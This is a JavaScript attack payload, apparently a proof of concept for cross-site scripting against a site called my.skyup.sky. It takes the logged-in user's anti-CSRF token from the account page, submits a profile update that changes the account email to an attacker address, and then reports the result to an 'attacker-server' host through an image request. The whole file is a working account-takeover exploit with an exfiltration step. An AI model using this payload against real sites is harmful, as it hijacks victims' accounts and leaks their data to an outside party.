// Fetch the CSRF token from the user's account page
fetch('my.skyup.sky/Account/MyAccount', {
  credentials: 'include' // Include cookies for authenticated requests
})
.then(response => response.text())
.then(html => {
  // Parse the HTML to extract the CSRF token
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const csrfToken = doc.querySelector('input[name="__RequestVerificationToken"]').value;

  // Prepare form data for the email change request
  const formData = new FormData();
  formData.append('__RequestVerificationToken', csrfToken);
  formData.append('Title', 'Mr');
  formData.append('FirstName', 'attacker2');
  formData.append('LastName', 'Change2');
  formData.append('Telephone', '9999999999');
  formData.append('EmailAddress', 'attacker@example.com'); // Updated email
  formData.append('ConfirmEmailAddress', 'attacker@example.com'); // Updated email
  formData.append('MainPosition', 'Headteacher');
  formData.append('CurrentSchool', 'Abbey College');
  formData.append('PostcodeLookupInput', '');

  // Submit the form to update the email
  return fetch('my.skyup.sky/Handlers/UpdateDetails', {
    method: 'POST',
    credentials: 'include', // Include cookies for authenticated requests
    body: formData
  });
})
.then(response => response.text())
.then(result => {
  // Notify the attacker-controlled server
  new Image().src = 'https://attacker-server/?email_changed=' + encodeURIComponent(result);
})
.catch(error => {
  console.error('Error:', error); // Log any errors to the console
});
